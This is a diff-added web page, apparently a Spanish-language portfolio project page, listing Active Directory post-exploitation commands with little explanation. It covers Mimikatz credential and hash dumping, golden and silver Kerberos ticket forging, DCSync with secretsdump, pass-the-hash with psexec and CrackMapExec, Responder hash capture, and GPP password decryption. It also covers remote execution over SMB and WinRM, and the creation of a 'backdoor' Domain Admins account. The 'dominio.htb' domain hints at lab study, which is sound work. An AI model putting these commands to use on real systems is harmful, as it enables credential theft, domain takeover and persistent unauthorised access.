+<h3 id="técnicas-de-post-explotación">Técnicas de Post-Explotación</h3>
+<h3 id="post-explotación-con-mimikatz">Post-Explotación con Mimikatz</h3>
+<h3 id="-uso-básico">🔹 Uso Básico</h3>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"></span>
+<span class="line"><span style="color:#8BE9FD">mimikatz.exe</span></span>
+<span class="line"><span style="color:#F8F8F2">privilege::debug</span></span>
+<span class="line"><span style="color:#F8F8F2">sekurlsa::logonpasswords</span></span>
+<span class="line"><span style="color:#F8F8F2">sekurlsa::msv</span></span>
+<span class="line"><span style="color:#F8F8F2">sekurlsa::kerberos</span></span>
+<span class="line"><span style="color:#F8F8F2">sekurlsa::tspkg</span></span>
+<span class="line"><span style="color:#F8F8F2">sekurlsa::wdigest</span></span>
+<span class="line"></span></code></pre>
+<h3 id="-dump-de-hashes">🔹 Dump de Hashes</h3>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"></span>
+<span class="line"><span style="color:#F8F8F2">lsadump::sam</span></span>
+<span class="line"><span style="color:#F8F8F2">lsadump::secrets</span></span>
+<span class="line"><span style="color:#F8F8F2">lsadump::cache</span></span>
+<span class="line"></span></code></pre>
+<h3 id="-tickets-kerberos">🔹 Tickets Kerberos</h3>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"></span>
+<span class="line"><span style="color:#F8F8F2">kerberos::list</span></span>
+<span class="line"><span style="color:#F8F8F2">kerberos::ptt ticket.kirbi</span></span>
+<span class="line"><span style="color:#F8F8F2">kerberos::golden </span><span style="color:#FF79C6">/</span><span style="color:#F8F8F2">user:Administrator </span><span style="color:#FF79C6">/</span><span style="color:#F8F8F2">domain:dominio.htb </span><span style="color:#FF79C6">/</span><span style="color:#F8F8F2">sid:S</span><span style="color:#FF79C6">-</span><span style="color:#BD93F9">1</span><span style="color:#FF79C6">-</span><span style="color:#BD93F9">5</span><span style="color:#FF79C6">-</span><span style="color:#BD93F9">21</span><span style="color:#FF79C6">-</span><span style="color:#F8F8F2">... </span><span style="color:#FF79C6">/</span><span style="color:#F8F8F2">krbtgt:HASH </span><span style="color:#FF79C6">/</span><span style="color:#F8F8F2">id:</span><span style="color:#BD93F9">500</span></span>
+<span class="line"></span></code></pre>
+<h3 id="-exportar-credenciales">🔹 Exportar credenciales</h3>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"></span>
+<span class="line"><span style="color:#F8F8F2">sekurlsa::ekeys</span></span>
+<span class="line"><span style="color:#F8F8F2">sekurlsa::credman</span></span>
+<span class="line"></span></code></pre>
+<h3 id="extracción-de-hashes">Extracción de Hashes</h3>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
+<span class="line"><span style="color:#6272A4"># Con credenciales</span></span>
+<span class="line"><span style="color:#50FA7B">secretsdump.py</span><span style="color:#F1FA8C"> dominio.local/usuario:password@DC01</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4"># Pass-the-Hash</span></span>
+<span class="line"><span style="color:#50FA7B">psexec.py</span><span style="color:#F1FA8C"> dominio.local/administrador@DC01</span><span style="color:#BD93F9"> -hashes</span><span style="color:#F1FA8C"> :</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">NTLM_HAS</span><span style="color:#F8F8F2">H</span><span style="color:#FF79C6">></span></span>
+<span class="line"></span></code></pre>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6272A4"># GPP Passwords</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#50FA7B">smbclient</span><span style="color:#F1FA8C"> //DC01/SYSVOL</span><span style="color:#BD93F9"> -N</span></span>
+<span class="line"><span style="color:#50FA7B">gpp-decrypt</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">Groups.xm</span><span style="color:#F8F8F2">l</span><span style="color:#FF79C6">></span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4"># Captura de Hashes</span></span>
+<span class="line"><span style="color:#50FA7B">responder</span><span style="color:#BD93F9"> -I</span><span style="color:#F1FA8C"> eth0</span><span style="color:#BD93F9"> -dwv</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4"># RCE vía SMB</span></span>
+<span class="line"><span style="color:#50FA7B">psexec.py</span><span style="color:#F1FA8C"> DOM/user:pass@HOST</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#50FA7B">wmiexec.py</span><span style="color:#F1FA8C"> DOM/user:pass@HOST</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4"># WinRM</span></span>
+<span class="line"><span style="color:#50FA7B">evil-winrm</span><span style="color:#BD93F9"> -i</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> pass</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4"># BloodHound</span></span>
+<span class="line"><span style="color:#50FA7B">bloodhound-python</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> pass</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> DOM</span><span style="color:#BD93F9"> -ip</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">DC_I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -c</span><span style="color:#F1FA8C"> All</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4"># Pass-the-Hash</span></span>
+<span class="line"><span style="color:#50FA7B">cme</span><span style="color:#F1FA8C"> smb</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -H</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">has</span><span style="color:#F8F8F2">h</span><span style="color:#FF79C6">></span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4"># DCSync</span></span>
+<span class="line"><span style="color:#50FA7B">secretsdump.py</span><span style="color:#BD93F9"> -just-dc</span><span style="color:#F1FA8C"> DOM/user:pass@DC_IP</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4"># Golden Ticket</span></span>
+<span class="line"><span style="color:#50FA7B">mimikatz</span><span style="color:#6272A4"> # kerberos::golden /domain:DOM.LOCAL /sid:&#x3C;SID> /rc4:&#x3C;krbtgt_hash> /user:admin</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4"># Silver Ticket</span></span>
+<span class="line"><span style="color:#50FA7B">mimikatz</span><span style="color:#6272A4"> # kerberos::golden /domain:DOM.LOCAL /target:HOST /rc4:&#x3C;service_hash> /user:fakeuser</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4"># Persistencia</span></span>
+<span class="line"><span style="color:#50FA7B">net</span><span style="color:#F1FA8C"> user</span><span style="color:#F1FA8C"> backdoor</span><span style="color:#F1FA8C"> Pass123</span><span style="color:#F1FA8C"> /add</span><span style="color:#F1FA8C"> /domain</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#50FA7B">net</span><span style="color:#F1FA8C"> group</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">Domain Admins</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C"> backdoor</span><span style="color:#F1FA8C"> /add</span><span style="color:#F1FA8C"> /domain</span></span>
+<span class="line"></span></code></pre> </div> <div class="mt-16 pt-8 border-t border-slate-800"> <a href="/projects" class="text-slate-400 hover:text-accentBlue transition-colors">
+← Volver a la lista de proyectos
+</a> </div> </article>   </div> </article> </main> <footer class="w-full py-6 mt-12"> <div class="container mx-auto text-sm text-slate-400">
+© 2025 Angel Corral - Todos los derechos reservados.
+</div> </footer> </div> </body></html>
